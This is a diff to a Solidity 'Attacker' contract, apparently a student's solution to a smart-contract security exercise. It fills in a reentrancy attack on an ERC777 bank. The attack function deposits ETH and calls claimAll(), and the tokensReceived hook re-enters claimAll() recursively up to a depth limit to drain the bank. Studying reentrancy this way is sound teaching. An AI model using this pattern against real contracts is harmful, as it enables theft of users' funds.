@@ -38,17 +38,9 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 
-		emit Deposit(msg.value);
-
-        bank.deposit{value: amt}();
-
-        ERC777 mcitrToken = bank.token();
-        uint256 attackerMCITRBalance = mcitrToken.balanceOf(address(this));
-        require(attackerMCITRBalance >= amt, "Attacker needs sufficient MCITR to redeem");
-
-        mcitrToken.approve(address(bank), amt);
-
-        bank.redeem(amt);
+        emit Deposit(msg.value); // Emit event for the deposit amount
+        bank.deposit{value: msg.value}();
+        bank.claimAll();
 	}
 
 	/*
@@ -73,17 +65,12 @@ contract Attacker is AccessControl, IERC777Recipient {
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
 
-		// Ensure the call is from the Bank's ERC777 token and to this Attacker contract
-        // Also, check the recursion depth to prevent stack overflow
-        if (from == address(bank.token()) && to == address(this) && depth < max_depth) {
-            depth++;
-            emit Recurse(depth);
-
-            // Check if the Bank still has ERC777 tokens (representing ETH) to withdraw
-            if (bank.token().balanceOf(address(bank)) > 0) { //
-                bank.claimAll(); // Recursively call claimAll() to exploit the reentrancy
-            }
-            depth--;
+		// Implement reentrancy with depth limit
+        if (depth < max_depth && bank.balance > 0) {
+            depth++; // Increment depth for the recursive call
+            emit Recurse(depth); // Emit event
+            bank.claimAll(); // Re-enter the vulnerable function
+            depth--; // Decrement depth after the recursive call returns (or fails)
         }
 	}
 
